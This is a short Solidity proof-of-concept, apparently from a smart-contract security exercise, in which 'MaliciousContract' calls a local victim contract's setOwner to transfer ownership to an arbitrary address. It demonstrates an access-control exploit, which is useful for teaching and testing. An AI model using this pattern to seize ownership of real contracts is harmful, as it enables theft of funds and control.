pragma solidity ^0.8.13;

import {victim} from "./victim.sol";

contract MaliciousContract {
    victim public targetContract;

    // Constructor takes the victim contract address
    constructor(victim _targetContract) {
        targetContract = _targetContract;
    }

    // Function to change the owner of the target contract
    function changeOwner(address newAddress) external {
        targetContract.setOwner(newAddress);
    }
}
